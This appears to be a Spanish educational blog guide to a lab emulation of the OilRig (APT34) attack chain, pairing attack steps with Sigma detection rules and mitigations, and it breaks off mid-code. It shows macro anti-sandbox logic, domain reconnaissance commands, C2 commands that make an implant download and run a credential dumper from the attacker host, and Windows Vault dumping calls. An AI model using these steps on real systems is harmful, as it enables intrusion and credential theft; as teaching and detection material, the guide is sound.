---
title: Clase 05 - APTs
date: 2025-10-18 06:20:00 -0500
categories: [Cybersecurity,Ethical Hacking,Pentesting,Exploitation Techniques,Buffer Overflows]
tags: [buffer overflow,exploit development,pentesting,reverse shell,msfvenom,shellcode,eip control,bad characters,fuzzing,xvulnerabilities]     # TAG names should always be lowercase
---

# Guía Educativa: Análisis de Emulación del Grupo APT OilRig (APT34)

## Tabla de Contenidos

- [Parte 1: Introducción y Contexto](#parte-1-introducción-y-contexto)
  - [1.1 Perfil del Actor de Amenaza](#11-perfil-del-actor-de-amenaza)
  - [1.2 Visión General del Ataque](#12-visión-general-del-ataque)
- [Parte 2: Análisis de la Cadena de Ataque](#parte-2-análisis-de-la-cadena-de-ataque)
  - [Fase 1: Acceso Inicial y Establecimiento](#fase-1-acceso-inicial-y-establecimiento)
  - [Fase 2: Movimiento Lateral hacia Exchange](#fase-2-movimiento-lateral-hacia-exchange)
  - [Fase 3: Compromiso del Servidor SQL y Exfiltración](#fase-3-compromiso-del-servidor-sql-y-exfiltración)
- [Parte 3: Análisis Técnico Profundo](#parte-3-análisis-técnico-profundo)
  - [3.1 Análisis de Malware](#31-análisis-de-malware)
  - [3.2 Infraestructura del Ataque](#32-infraestructura-del-ataque)
  - [3.3 Ingeniería de Detección](#33-ingeniería-de-detección)
- [Parte 4: Guía de Laboratorio Práctico](#parte-4-guía-de-laboratorio-práctico)
  - [4.1 Configuración del Entorno](#41-configuración-del-entorno)
  - [4.2 Ejecución de la Emulación](#42-ejecución-de-la-emulación)
  - [4.3 Ejercicios para el Equipo Azul](#43-ejercicios-para-el-equipo-azul)
- [Parte 5: Apéndices](#parte-5-apéndices)

---

# Parte 1: Introducción y Contexto

## 1.1 Perfil del Actor de Amenaza

### ¿Quién es OilRig (APT34)?

OilRig, también conocido como APT34, Helix Kitten, o Cobalt Gypsy, es un grupo de amenaza persistente avanzada (APT) que ha sido atribuido con alta confianza a actores patrocinados por el estado iraní. El grupo ha estado activo desde al menos 2014 y ha demostrado capacidades sofisticadas en operaciones de ciberespionaje.

### Contexto Histórico

**Cronología de Actividad:**
- **2014-2015**: Primeras operaciones documentadas contra objetivos en Oriente Medio
- **2016-2017**: Expansión de campañas hacia el sector energético y financiero
- **2018**: Descubrimiento de las campañas DNSpionage y herramientas como Helminth
- **2019-2020**: Evolución del arsenal con SideTwist, RDAT y otras herramientas personalizadas
- **2021**: Documentación de campañas actualizadas por Check Point Research

### Objetivos Típicos

OilRig ha demostrado un interés consistente en los siguientes sectores:

1. **Energía e Infraestructura Crítica**
   - Compañías petroleras y de gas
   - Empresas de servicios públicos
   - Infraestructura energética

2. **Sector Gubernamental**
   - Ministerios y agencias gubernamentales
   - Organizaciones diplomáticas
   - Entidades de defensa

3. **Sector Financiero**
   - Instituciones bancarias
   - Servicios financieros
   - Empresas de inversión

4. **Telecomunicaciones y Tecnología**
   - Proveedores de servicios de telecomunicaciones
   - Empresas de tecnología
   - Proveedores de servicios gestionados

### Perfil Geográfico

El grupo ha dirigido sus operaciones principalmente hacia:
- Oriente Medio (Arabia Saudita, Emiratos Árabes Unidos, Qatar)
- Estados Unidos
- Europa (especialmente objetivos con intereses en Oriente Medio)
- Asia (Corea del Sur, Japón)

### Motivaciones y Objetivos

Las operaciones de OilRig típicamente buscan:

**Objetivos Estratégicos:**
- Recopilación de inteligencia sobre infraestructura crítica
- Espionaje económico e industrial
- Monitoreo de entidades políticas y diplomáticas
- Acceso persistente a redes objetivo

**Métodos Característicos:**
- Campañas de spearphishing altamente dirigidas
- Desarrollo de herramientas personalizadas
- Explotación de servicios públicos (Exchange, VPN)
- Persistencia a largo plazo en redes comprometidas

### Sofisticación Técnica

**Nivel de Habilidad:** Intermedio a Avanzado

**Características Distintivas:**
- Desarrollo activo de malware personalizado
- Técnicas de evasión de detección
- Uso creativo de protocolos legítimos (DNS, HTTP, EWS)
- Capacidad de adaptación ante medidas defensivas
- Operaciones de larga duración con objetivos claros

---

## 1.2 Visión General del Ataque

### Descripción del Escenario

Esta emulación de adversario reproduce una campaña típica de OilRig dirigida a comprometer una organización con el objetivo final de exfiltrar información sensible almacenada en un servidor SQL. El escenario se desarrolla en tres fases distintas que representan la progresión natural de un ataque APT sofisticado.

### Narrativa del Ataque

La campaña comienza cuando un administrador de Exchange Web Services (EWS) llamado Gosta recibe un correo electrónico de spearphishing que aparenta ser documentación de marketing legítima. Al abrir el documento de Microsoft Word adjunto y habilitar las macros, Gosta inadvertidamente permite la instalación del backdoor SideTwist en su estación de trabajo.

Una vez establecido el acceso inicial, los atacantes realizan reconocimiento exhaustivo del entorno, descubriendo que Gosta posee privilegios administrativos sobre el servidor de Exchange. Aprovechando esta información, los atacantes roban las credenciales de Gosta y las utilizan para moverse lateralmente hacia el servidor Exchange.

En el servidor Exchange, los atacantes instalan el webshell TwoFace, que proporciona persistencia adicional y capacidades de comando y control. Desde esta posición privilegiada, los atacantes descubren la existencia de un servidor SQL que contiene datos críticos de infraestructura.

Para alcanzar el servidor SQL, los atacantes roban credenciales privilegiadas de un administrador SQL llamado Tous mediante el uso de Mimikatz. Utilizando estas credenciales comprometidas, ejecutan movimiento lateral hacia el servidor SQL mediante pass-the-hash y PsExec.

Finalmente, los atacantes despliegan el backdoor RDAT en el servidor SQL, lo utilizan para localizar y copiar archivos de respaldo de base de datos, y exfiltran estos datos a través de la API de Exchange Web Services hacia una cuenta de correo electrónico controlada por los atacantes. La exfiltración se realiza ocultando los datos dentro de imágenes BMP adjuntas a correos electrónicos, una técnica de esteganografía que dificulta la detección.

### Arquitectura del Entorno Objetivo

**Topología de Red:**

```
Internet
    |
    v
[Atacante: 192.168.0.4]
[Servidor Mail: 192.168.0.5]
    |
    v
[Red Corporativa: 10.1.0.0/24]
    |
    +-- [Controlador de Dominio: DISKJOCKEY - 10.1.0.4]
    |
    +-- [Estación de Trabajo: THEBLOCK - 10.1.0.5]
    |   Usuario: BOOMBOX\gosta (Administrador EWS)
    |
    +-- [Servidor Exchange: WATERFALLS - 10.1.0.6]
    |   Servicios: OWA, EAC, EWS API
    |
    +-- [Servidor SQL: ENDOFROAD - 10.1.0.7]
        Usuario Privilegiado: BOOMBOX\tous (Administrador SQL)
        Datos Críticos: sitedata_db.bak
```

**Componentes de Infraestructura del Atacante:**

1. **Plataforma de Ataque Linux (192.168.0.4)**
   - Sistema Operativo: Kali Linux 2019.2
   - Función: Servidor C2 para SideTwist
   - Servicios: Servidor HTTP (puerto 443)
   - Herramientas: FreeRDP, curl, herramientas de pentesting

2. **Servidor de Correo y Archivos (192.168.0.5)**
   - Sistema Operativo: Kali Linux 2019.2
   - Función: Entrega de spearphishing
   - Servicios: Postfix (SMTP), Apache (HTTP)
   - Payloads: Marketing_Materials.zip

### Las Tres Fases del Ataque

#### **Fase 1: Acceso Inicial y Establecimiento (Pasos 1-3)**

**Objetivo:** Establecer presencia inicial y recopilar información básica

**Resumen de Actividades:**
- Spearphishing con documento Word malicioso
- Despliegue del backdoor SideTwist vía macros VBA
- Establecimiento de persistencia mediante tarea programada
- Reconocimiento inicial del sistema comprometido
- Robo de credenciales de bajo privilegio con VALUEVAULT

**Herramientas Utilizadas:**
- Documento Word con macros maliciosas
- SideTwist (backdoor HTTP)
- VALUEVAULT (volcado de credenciales)

**Resultados Clave:**
- Acceso persistente a la estación de trabajo de Gosta
- Descubrimiento de membresía en grupo "EWS Admins"
- Obtención de credenciales en texto claro de Gosta
- Identificación del servidor Exchange (WATERFALLS)

#### **Fase 2: Movimiento Lateral hacia Exchange (Pasos 4-7)**

**Objetivo:** Comprometer el servidor Exchange y establecer acceso privilegiado

**Resumen de Actividades:**
- Instalación del webshell TwoFace en el servidor Exchange
- Reconocimiento del servidor Exchange
- Volcado de credenciales privilegiadas con Mimikatz
- Establecimiento de túnel RDP mediante plink
- Movimiento lateral hacia Exchange usando credenciales de Gosta

**Herramientas Utilizadas:**
- TwoFace (webshell personalizado en ASP.NET)
- Mimikatz (volcado de credenciales de memoria LSASS)
- Plink (túnel SSH para RDP)

**Resultados Clave:**
- Persistencia adicional vía webshell
- Acceso RDP al servidor Exchange
- Credenciales NTLM del administrador SQL (Tous)
- Descubrimiento del servidor SQL (ENDOFROAD)

#### **Fase 3: Compromiso del Servidor SQL y Exfiltración (Pasos 8-11)**

**Objetivo:** Acceder al servidor SQL, localizar datos sensibles y exfiltrarlos

**Resumen de Actividades:**
- Pass-the-hash con credenciales de Tous
- Movimiento lateral hacia SQL Server mediante PsExec
- Despliegue del backdoor RDAT
- Descubrimiento de archivos de respaldo de base de datos
- Exfiltración mediante API EWS con esteganografía
- Limpieza de artefactos y salida

**Herramientas Utilizadas:**
- Mimikatz (pass-the-hash)
- PsExec (ejecución remota)
- RDAT (backdoor de exfiltración)
- API de Exchange Web Services

**Resultados Clave:**
- Acceso al servidor SQL como administrador
- Localización de archivos de respaldo críticos
- Exfiltración exitosa de datos vía EWS API
- Limpieza de evidencia forense

### Flujo de Datos del Ataque

```
[Spearphishing Email]
        ↓
[Documento Word Malicioso]
        ↓
[Macro VBA ejecuta]
        ↓
[SideTwist instalado en THEBLOCK]
        ↓
[Callback a C2: 192.168.0.4:443]
        ↓
[Reconocimiento + VALUEVAULT]
        ↓
[Credenciales de Gosta obtenidas]
        ↓
[TwoFace webshell → WATERFALLS]
        ↓
[Mimikatz → Credenciales de Tous]
        ↓
[Pass-the-hash + PsExec → ENDOFROAD]
        ↓
[RDAT instalado en SQL Server]
        ↓
[Archivos .bak fragmentados en chunks]
        ↓
[Esteganografía en archivos BMP]
        ↓
[Exfiltración vía EWS API]
        ↓
[Buzón atacante: sistan@shirinfarhad.com]
```

### Mapeo a MITRE ATT&CK

Esta campaña demuestra técnicas a lo largo de toda la matriz ATT&CK:

| Táctica | Cantidad de Técnicas | Ejemplos Principales |
|---------|---------------------|---------------------|
| Reconnaissance | 2 | T1592, T1589 |
| Resource Development | 3 | T1583, T1587, T1588 |
| Initial Access | 2 | T1566.002 (Phishing: Spearphishing Link) |
| Execution | 4 | T1204.002, T1059.005, T1569.002 |
| Persistence | 3 | T1053.005, T1505.003 |
| Privilege Escalation | 2 | T1078.002, T1068 |
| Defense Evasion | 6 | T1027, T1036, T1564.001, T1070.004 |
| Credential Access | 4 | T1555.004, T1003.001, T1550.002 |
| Discovery | 12 | T1082, T1033, T1016, T1087, T1069, etc. |
| Lateral Movement | 4 | T1021.001, T1021.002, T1570 |
| Collection | 2 | T1005, T1074.001 |
| Command and Control | 4 | T1071.001, T1573.001, T1572, T1105 |
| Exfiltration | 2 | T1041, T1048.003 |

### Objetivos de Aprendizaje

Al completar esta guía educativa, el estudiante será capaz de:

1. **Comprender la Metodología APT**
   - Identificar las fases de un ataque sofisticado
   - Reconocer patrones de comportamiento de actores APT
   - Entender la progresión lógica de un compromiso

2. **Análisis de Técnicas Específicas**
   - Analizar el funcionamiento de backdoors personalizados
   - Comprender técnicas de movimiento lateral
   - Identificar métodos de exfiltración encubierta

3. **Perspectiva Defensiva**
   - Reconocer oportunidades de detección en cada fase
   - Desarrollar estrategias de mitigación efectivas
   - Implementar controles de seguridad apropiados

4. **Aplicación Práctica**
   - Ejecutar emulaciones de adversario en entornos controlados
   - Validar controles de seguridad existentes
   - Desarrollar reglas de detección personalizadas

---

# Parte 2: Análisis de la Cadena de Ataque

## Fase 1: Acceso Inicial y Establecimiento

### Paso 1: Compromiso Inicial y Persistencia

#### Objetivo de la Actividad

Establecer acceso inicial a la red objetivo mediante spearphishing y desplegar el backdoor SideTwist con persistencia a través de una tarea programada en Windows.

#### Contexto del Escenario

El usuario Gosta, quien es administrador del servidor Exchange Web Services, recibe un correo electrónico que aparenta provenir de "team@ganjavigms.com" con un enlace para descargar un archivo comprimido llamado "Marketing_Materials.zip". El correo emplea técnicas de ingeniería social para convencer a Gosta de que se trata de documentación legítima relacionada con materiales de marketing.

Al hacer clic en el enlace, Gosta descarga el archivo desde el servidor del atacante (192.168.0.5). El archivo ZIP está protegido con contraseña (!M@rk3ting!) para evadir análisis automatizado de seguridad de correo electrónico. Una vez descomprimido, Gosta encuentra un documento de Microsoft Word llamado "GGMS Overview.doc".

#### Técnicas MITRE ATT&CK

**T1566.002 - Phishing: Spearphishing Link**
- El atacante envía un correo dirigido con un enlace a un archivo malicioso
- Utiliza ingeniería social para incentivar la descarga del archivo

**T1204.002 - User Execution: Malicious File**
- Requiere que el usuario abra el documento y habilite macros
- El archivo aparenta ser contenido legítimo de negocios

**T1059.005 - Command and Scripting Interpreter: Visual Basic**
- Las macros VBA ejecutan código malicioso al abrir/cerrar el documento
- Las macros realizan verificaciones anti-sandbox antes de ejecutarse

#### Flujo de Ejecución Técnica

**Al abrir el documento:**

1. **Recolección de Variables de Entorno (T1082, T1033)**
   ```vba
   computername = Environ("computername")
   username = Environ("username")
   ```
   - El macro recopila el nombre del equipo y del usuario
   - Esta información se utiliza posteriormente para identificación del beacon

2. **Verificación Anti-Sandbox (T1497.001)**
   ```vba
   If Application.MouseAvailable = False Then Exit Sub
   ```
   - Detecta si hay un mouse disponible
   - Los entornos de análisis automatizado típicamente carecen de mouse
   - Si no se detecta mouse, la macro termina sin ejecutar payload

3. **Extracción del Payload (T1027)**
   - El payload SideTwist está embebido en el documento como Base64
   - Se almacena en `UserForm1.TextBox1.Text`
   - El macro decodifica y escribe el payload a disco

4. **Creación de Directorio y Escritura de Archivos (T1105, T1083)**
   ```
   Directorio: C:\Users\gosta\AppData\Local\SystemFailureReporter\

   Archivos creados:
   - b.doc (realmente un ejecutable, el payload SideTwist)
   - update.xml (archivo vacío usado como killswitch)
   ```

**Al cerrar el documento:**

5. **Segunda Verificación Anti-Sandbox (T1497.001)**
   - Se repite la verificación de `Application.MouseAvailable`
   - Esta doble verificación aumenta la evasión

6. **Renombrado del Payload (T1036)**
   ```
   b.doc → SystemFailureReporter.exe
   ```
   - El nombre hace referencia a componentes legítimos de Windows
   - Busca confundir al usuario y a analistas forenses

7. **Establecimiento de Persistencia (T1053.005)**
   - Crea una tarea programada llamada "SystemFailureReporter"
   - La tarea ejecuta el payload cada 5 minutos
   - Se ejecuta en el contexto del usuario actual (Gosta)

   ```
   Tarea: SystemFailureReporter
   Comando: C:\Users\gosta\AppData\Local\SystemFailureReporter\SystemFailureReporter.exe
   Frecuencia: Cada 5 minutos
   Usuario: BOOMBOX\gosta
   ```

**Cuando SystemFailureReporter.exe se ejecuta:**

8. **Recolección de Información del Sistema (T1082, T1033)**
   - Utiliza GetUserName API para obtener el nombre del usuario actual
   - Utiliza GetComputerName API para obtener el nombre del equipo
   - Utiliza GetDomainName API para obtener el dominio

9. **Establecimiento de Comunicación C2 (T1071.001, T1573.001)**
   ```
   Protocolo: HTTP sobre puerto 443 (sin TLS)
   Servidor C2: 192.168.0.4:443
   Cifrado: XOR con clave estática
   Método: GET/POST requests
   ```

#### Análisis del Malware: SideTwist

**Arquitectura del C2:**

El servidor de Comando y Control presenta una página falsa de error de Flickr cuando se accede sin credenciales válidas. Las instrucciones para los implantes se incrustan entre etiquetas `<script>` en el código HTML de la página.

**Estructura del Comando:**
```
<script>
[base64( XOR_encrypt( comando ) )]
</script>
```

**Proceso de Comunicación:**

1. El implante realiza una petición GET al servidor C2
2. El servidor responde con la página HTML que contiene comandos cifrados
3. El implante extrae el contenido entre etiquetas `<script>`
4. Decodifica el Base64 y descifra usando XOR
5. Ejecuta el comando y captura la salida
6. Cifra la salida usando XOR y la codifica en Base64
7. Envía los resultados al C2 mediante POST request

**Características de Seguridad Operacional:**

- Si el implante no encuentra el archivo `update.xml`, se termina automáticamente (killswitch)
- Las peticiones que no corresponden a implantes registrados reciben solo la página falsa
- El uso de XOR simple permite evasión de inspección SSL/TLS profunda (no hay certificados sospechosos)

#### Oportunidades de Detección

**Nivel de Red:**
- Tráfico HTTP en puerto 443 sin TLS (altamente anómalo)
- Beacons periódicos cada 5 minutos hacia IP externa
- Patrón de peticiones HTTP con User-Agent sospechoso
- Transferencia de datos codificados en Base64 en cuerpo de POST

**Nivel de Host:**
- Creación de tarea programada desde proceso WINWORD.EXE
- WINWORD.EXE escribiendo archivos .exe en AppData
- Ejecución de .exe renombrado desde directorio de usuario
- Archivo llamado "update.xml" en ubicación inusual
- Proceso con nombre legítimo iniciado desde ubicación no estándar

**Nivel de Comportamiento:**
- Proceso ejecutándose cada 5 minutos de forma consistente
- Comunicación de red iniciada por proceso en AppData
- Uso de APIs de sistema (GetUserName, GetComputerName) por proceso no firmado

**Reglas de Detección Ejemplo:**

```yaml
# Sigma Rule Example
title: Tarea Programada Creada por Microsoft Word
status: experimental
logsource:
    product: windows
    service: security
    definition: 'Requiere auditoría de creación de tareas programadas'
detection:
    selection:
        EventID: 4698  # Tarea programada creada
        TaskContent|contains: 'WINWORD.EXE'
    condition: selection
falsepositives:
    - Documentos legítimos que automatizan tareas (muy raro)
level: high
```

#### Estrategias de Mitigación

**Prevención:**
1. **Configuración de Microsoft Office**
   - Deshabilitar macros de documentos descargados de Internet
   - Implementar política de "Deshabilitar todas las macros excepto digitalmente firmadas"
   - Utilizar Protected View para archivos de fuentes no confiables

2. **Controles de Correo Electrónico**
   - Filtrado de archivos comprimidos con contraseña
   - Análisis de sandboxing de archivos adjuntos
   - Validación SPF/DKIM/DMARC rigurosa

3. **Seguridad de Endpoint**
   - Application whitelisting (solo ejecutables firmados)
   - Bloqueo de ejecución desde carpetas de usuario (%APPDATA%, %TEMP%)
   - EDR con detección de comportamiento de macros

**Detección:**
1. **Monitoreo de Tareas Programadas**
   - Alertas sobre creación de tareas desde procesos de Office
   - Validación de ubicación de ejecutables en tareas programadas

2. **Análisis de Tráfico**
   - Detección de HTTP en puerto 443
   - Inspección de contenido Base64 en HTTP POST

3. **Behavioral Analytics**
   - Detección de beaconing periódico
   - Identificación de procesos de corta duración recurrentes

**Respuesta:**
1. Aislar el sistema comprometido de la red
2. Eliminar la tarea programada maliciosa
3. Eliminar el directorio SystemFailureReporter
4. Analizar correos similares en otros buzones
5. Bloquear comunicaciones hacia IP del C2
6. Realizar hunting para identificar otros sistemas comprometidos

---

### Paso 2: Reconocimiento de la Estación de Trabajo

#### Objetivo de la Actividad

Realizar enumeración exhaustiva del sistema comprometido para identificar privilegios del usuario, configuración de red, cuentas de dominio, grupos administrativos y servicios activos que puedan facilitar el movimiento lateral.

#### Contexto del Escenario

Una vez establecida la comunicación con el implante SideTwist, los operadores de OilRig proceden a ejecutar una serie de comandos de reconocimiento estándar. Estos comandos se ejecutan a través de `cmd.exe` utilizando las capacidades de ejecución remota de comandos del backdoor.

La información recopilada en esta fase permite a los atacantes comprender el entorno en el que operan y planificar los próximos pasos del ataque. Específicamente, los atacantes buscan identificar:
- Membresías de grupos privilegiados
- Servidores de infraestructura crítica (Exchange, SQL, etc.)
- Configuración de red y conectividad
- Cuentas de alto valor como objetivos potenciales

#### Técnicas MITRE ATT&CK

Este paso implementa múltiples técnicas de Discovery:

- **T1033** - System Owner/User Discovery
- **T1082** - System Information Discovery
- **T1016** - System Network Configuration Discovery
- **T1087.002** - Account Discovery: Domain Account
- **T1069.002** - Permission Groups Discovery: Domain Groups
- **T1201** - Password Policy Discovery
- **T1087.001** - Account Discovery: Local Account
- **T1069.001** - Permission Groups Discovery: Local Groups
- **T1049** - System Network Connections Discovery
- **T1057** - Process Discovery
- **T1007** - System Service Discovery
- **T1012** - Query Registry
- **T1018** - Remote System Discovery

#### Comandos Ejecutados

Los comandos se ejecutan en dos rondas principales:

**Ronda 1: Reconocimiento Inicial General**

```batch
whoami
```
- **Propósito:** Confirmar el contexto de usuario bajo el cual se ejecuta el implante
- **Salida esperada:** `BOOMBOX\gosta`
- **Valor para el atacante:** Valida el usuario objetivo y el dominio

```batch
hostname
```
- **Propósito:** Identificar el nombre del equipo comprometido
- **Salida esperada:** `THEBLOCK`
- **Valor para el atacante:** Referencia para tracking de sistemas comprometidos

```batch
ipconfig /all
```
- **Propósito:** Enumerar configuración de red completa
- **Información obtenida:**
  - Dirección IP: 10.1.0.5
  - Máscara de subred: 255.255.255.0
  - Gateway predeterminado: 10.1.0.1
  - Servidor DNS: 10.1.0.4 (DISKJOCKEY - Controlador de Dominio)
  - Dominio: boombox.local
  - Adaptadores de red y direcciones MAC

```batch
net user /domain
```
- **Propósito:** Enumerar todas las cuentas de usuario en el dominio
- **Información obtenida:**
  - Lista de usuarios: gosta, tous, mariam, shiroyeh, shiroyeh_admin, etc.
  - Identifica usuarios de interés para comprometer

```batch
net group /domain
```
- **Propósito:** Listar todos los grupos del dominio
- **Grupos descubiertos:**
  - Domain Admins
  - Enterprise Admins
  - EWS Admins (grupo personalizado)
  - SQL Admins (grupo personalizado)
  - Domain Users
  - Otros grupos estándar de Active Directory

```batch
net group "domain admins" /domain
```
- **Propósito:** Identificar miembros del grupo de administradores del dominio
- **Información obtenida:**
  - shiroyeh_admin (cuenta administrativa)
  - Administrator (cuenta integrada)

```batch
net group "Exchange Trusted Subsystem" /domain
```
- **Propósito:** Identificar servidores Exchange en el dominio
- **Información obtenida:**
  - WATERFALLS$ (servidor Exchange)
  - Indica presencia de infraestructura Exchange

```batch
net accounts /domain
```
- **Propósito:** Obtener política de contraseñas del dominio
- **Información obtenida:**
  - Longitud mínima de contraseña
  - Historial de contraseñas
  - Tiempo de bloqueo de cuenta
  - Duración máxima de contraseña
  - Duración mínima de contraseña

```batch
net user
```
- **Propósito:** Listar cuentas de usuario locales en el sistema
- **Información obtenida:**
  - Cuentas locales vs. cuentas de dominio
  - Usuarios que han iniciado sesión en el sistema

```batch
net localgroup administrators
```
- **Propósito:** Identificar miembros del grupo Administradores local
- **Información crítica:**
  - Domain Admins (grupo)
  - BOOMBOX\gosta (usuario actual)
  - Otros administradores locales

```batch
netstat -an
```
- **Propósito:** Identificar conexiones de red activas y puertos en escucha
- **Información obtenida:**
  - Conexiones establecidas a otros sistemas
  - Servicios en escucha (RDP 3389, SMB 445, etc.)
  - Indicios de servidores adicionales en la red

```batch
tasklist
```
- **Propósito:** Enumerar procesos en ejecución
- **Información obtenida:**
  - Software de seguridad activo
  - Aplicaciones instaladas
  - Servicios en ejecución

```batch
sc query
```
- **Propósito:** Listar servicios de Windows y su estado
- **Información obtenida:**
  - Servicios en ejecución vs. detenidos
  - Software de terceros instalado
  - Servicios potencialmente explotables

```batch
systeminfo
```
- **Propósito:** Recopilar información detallada del sistema
- **Información obtenida:**
  - Sistema operativo: Windows 10 Build 17763
  - Arquitectura: x64
  - Dominio: BOOMBOX
  - Hotfixes instalados
  - Configuración de memoria
  - Tiempo de actividad del sistema

```batch
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
```
- **Propósito:** Identificar conexiones RDP recientes del usuario
- **Información obtenida:**
  - Servidores a los que el usuario se ha conectado vía RDP
  - Potenciales objetivos para movimiento lateral

**Ronda 2: Reconocimiento Enfocado**

Basándose en los resultados de la primera ronda, los atacantes ejecutan comandos más específicos:

```batch
net user gosta /domain
```
- **Propósito:** Obtener información detallada sobre el usuario comprometido
- **Descubrimiento crítico:**
  ```
  Local Group Memberships      *None
  Global Group memberships     *EWS Admins           *Domain Users
  ```
- **Implicación:** Gosta tiene privilegios administrativos sobre el servidor Exchange

```batch
net group "SQL Admins" /domain
```
- **Propósito:** Identificar administradores del servidor SQL
- **Descubrimiento crítico:**
  ```
  Group name     SQL Admins
  Members
  ---------------
  tous
  ```
- **Implicación:** El usuario "tous" es administrador del SQL Server

```batch
nslookup WATERFALLS
```
- **Propósito:** Resolver la dirección IP del servidor Exchange
- **Información obtenida:**
  ```
  Server:  DISKJOCKEY.boombox.local
  Address:  10.1.0.4

  Name:    WATERFALLS.boombox.local
  Address:  10.1.0.6
  ```

#### Hallazgos Clave del Reconocimiento

Al finalizar esta fase, los atacantes han identificado:

**Información sobre el Usuario Actual:**
- Usuario: BOOMBOX\gosta
- Miembro de: EWS Admins
- Implicación: Tiene privilegios administrativos sobre WATERFALLS (Exchange Server)

**Infraestructura Crítica Identificada:**
- Controlador de Dominio: DISKJOCKEY (10.1.0.4)
- Servidor Exchange: WATERFALLS (10.1.0.6)
- Servidor SQL: No identificado directamente aún, pero descubierto usuario "tous" como SQL Admin

**Objetivos de Alto Valor:**
- Usuario tous: Administrador SQL (objetivo para robo de credenciales)
- Usuario shiroyeh_admin: Administrador del dominio (objetivo de escalación)
- Servidor WATERFALLS: Objetivo inmediato para movimiento lateral

**Configuración de Seguridad:**
- Política de contraseñas del dominio
- Grupos administrativos personalizados
- Servicios y aplicaciones instaladas

#### Oportunidades de Detección

**Nivel de Endpoint:**

1. **Ejecución de Múltiples Comandos de Reconocimiento**
   - Patrón de comandos de discovery ejecutados en secuencia rápida
   - Comandos `net`, `ipconfig`, `whoami` ejecutados por mismo proceso padre

2. **Uso de Comandos Administrativos por Procesos Inusuales**
   - SystemFailureReporter.exe ejecutando comandos `net group /domain`
   - Proceso desde AppData ejecutando consultas de Active Directory

**Detección Basada en Comportamiento:**

```yaml
# Ejemplo de regla de correlación
title: Secuencia de Comandos de Reconocimiento de Dominio
description: Detecta ejecución de múltiples comandos de reconocimiento en corto período
detection:
    selection:
        CommandLine|contains:
            - 'net user /domain'
            - 'net group /domain'
            - 'net localgroup administrators'
            - 'whoami'
            - 'ipconfig /all'
    timeframe: 5m
    condition: selection | count() > 5
level: high
```

**Indicadores en Logs de Windows:**

- **Event ID 4688** (Process Creation): Creación de procesos cmd.exe por SystemFailureReporter.exe
- **Event ID 4624** (Logon): Actividad de red del implante
- **Event ID 4648** (Logon with Explicit Credentials): Si se utilizan credenciales diferentes

**Indicadores de Red:**

- Múltiples peticiones HTTP POST hacia 192.168.0.4:443
- Contenido Base64 en cuerpo de POST (resultados de comandos)
- Patrón de beaconing consistente

#### Estrategias de Mitigación

**Prevención:**

1. **Principio de Menor Privilegio**
   - Los administradores de Exchange no deberían trabajar desde estaciones de trabajo con sus cuentas privilegiadas
   - Implementar cuentas administrativas separadas para tareas administrativas

2. **Hardening de Sistemas**
   - Deshabilitar comandos de reconocimiento innecesarios para usuarios estándar
   - Implementar AppLocker o WDAC para restringir ejecución desde %APPDATA%

3. **Segmentación de Red**
   - Limitar qué sistemas pueden consultar Active Directory
   - Restringir comunicaciones salientes desde estaciones de trabajo

**Detección:**

1. **SIEM y Correlación**
   - Crear reglas que detecten secuencias de comandos de reconocimiento
   - Alertar sobre uso de `net group /domain` desde procesos inusuales

2. **EDR y Behavioral Analytics**
   - Detección de proceso hijo cmd.exe desde procesos no estándar
   - Identificación de patrones de reconocimiento automatizado

3. **Honeytokens**
   - Crear grupos de seguridad señuelo (ej. "VPN Admins", "Backup Admins")
   - Alertar cuando se enumeran estos grupos

**Respuesta:**

1. Investigar el proceso que ejecutó los comandos
2. Revisar historial de comandos ejecutados por el usuario
3. Analizar tráfico de red del sistema comprometido
4. Ejecutar memoria forense para identificar inyección de código
5. Verificar otros sistemas donde el usuario ha iniciado sesión

---

### Paso 3: Volcado de Credenciales de Bajo Privilegio

#### Objetivo de la Actividad

Utilizar la herramienta VALUEVAULT para extraer credenciales almacenadas en el Administrador de Credenciales de Windows (Windows Credential Manager) del usuario Gosta, obteniendo así su contraseña en texto claro para facilitar movimiento lateral posterior.

#### Contexto del Escenario

Después del reconocimiento, los atacantes han confirmado que Gosta es miembro del grupo "EWS Admins", lo que significa que posee privilegios administrativos sobre el servidor Exchange (WATERFALLS). Sin embargo, para aprovechar estos privilegios, los atacantes necesitan las credenciales reales de Gosta.

OilRig emplea VALUEVAULT, una herramienta personalizada desarrollada en Go que extrae credenciales del Windows Credential Manager sin necesidad de privilegios elevados. Esta herramienta es particularmente efectiva porque muchos usuarios almacenan credenciales para sitios web, servicios de red y aplicaciones en el Credential Manager de Windows.

#### Técnicas MITRE ATT&CK

**T1105 - Ingress Tool Transfer**
- SideTwist descarga VALUEVAULT (b.exe) desde el servidor C2
- El archivo se transfiere cifrado con XOR y codificado en Base64

**T1555.004 - Credentials from Password Stores: Windows Credential Manager**
- VALUEVAULT accede al Windows Vault mediante APIs legítimas
- Extrae credenciales almacenadas sin requerir privilegios administrativos

**T1041 - Exfiltration Over C2 Channel**
- Los resultados del volcado se exfiltran a través del canal C2 de SideTwist
- Se utiliza el mismo protocolo HTTP con cifrado XOR

#### Flujo de Ejecución Técnica

**Paso 1: Descarga de VALUEVAULT**

El operador envía un comando al implante SideTwist para descargar la herramienta:

```bash
./evalsC2client.py --set-task goTb '102 C:\Users\gosta\AppData\Roaming\b.exe|b.exe'
```

**Desglose del comando:**
- `102`: Código de operación para descarga de archivo
- `C:\Users\gosta\AppData\Roaming\b.exe`: Ruta de destino en el sistema objetivo
- `|b.exe`: Nombre del archivo en el servidor C2

**Proceso en el sistema objetivo:**
1. SideTwist recibe la instrucción durante su próximo beacon (máx. 5 minutos)
2. Realiza una petición HTTP GET al C2 para obtener el payload b.exe
3. El C2 responde con b.exe cifrado con XOR y codificado en Base64
4. SideTwist decodifica y descifra el archivo
5. Escribe b.exe en `C:\Users\gosta\AppData\Roaming\b.exe`
6. Reporta éxito al C2

**Paso 2: Ejecución de VALUEVAULT**

```bash
./evalsC2client.py --set-task goTb '101 C:\Users\gosta\AppData\Roaming\b.exe'
```

**Desglose del comando:**
- `101`: Código de operación para ejecución de comando
- El comando ejecuta b.exe (VALUEVAULT)

**Funcionamiento de VALUEVAULT:**

VALUEVAULT es una implementación en Go del concepto "Windows Vault Password Dumper". Realiza los siguientes pasos:

1. **Enumeración de Vaults**
   ```go
   // Abre el Windows Vault usando la API VaultEnumerateVaults
   VaultEnumerateVaults(0, &vaultCount, &vaultGuid)
   ```

2. **Acceso a Ítems del Vault**
   ```go
   // Para cada vault, enumera los ítems almacenados
   VaultOpenVault(vaultGuid, 0, &vaultHandle)
